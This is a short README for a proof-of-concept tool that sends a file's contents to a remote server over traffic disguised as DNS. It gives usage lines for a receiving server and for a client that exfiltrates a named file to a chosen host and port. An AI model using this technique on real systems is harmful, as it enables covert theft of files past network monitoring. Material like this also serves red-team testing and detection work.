# About

This repository contains a proof of work for extracting file-content via (what looks like) DNS.
The *client* takes a file and sends it's content to the *server*.

Upon receiving a payload, the server will display it's content and save it to a file.

# Usage

## Server

`./server.py [HOST [PORT]]`

default: 172.0.0.1:53

e.g.: 

`./server.py`: Start server on 172.0.0.1:53

`./server.py 0.0.0.0`: Start server on 0.0.0.0:53

`./server.py 192.168.0.100 4000`: Start server on 192.168.0.100:4000


**Note**: When running on low ports (like 53), root privileges are required.

## Client

`./client.py FILE [HOST [PORT]]`

default: 172.0.0.1:53

e.g.: 

`./client.py robotergesetz.txt`: Send content of robotergesetz.txt to 172.0.0.1:53

`./client.py robotergesetz.txt 0.0.0.0`: Send content of robotergesetz.txt to 0.0.0.0:53

`./client.py robotergesetz.txt 192.168.0.100 4000`: Send content of robotergesetz.txt to 192.168.0.100:4000

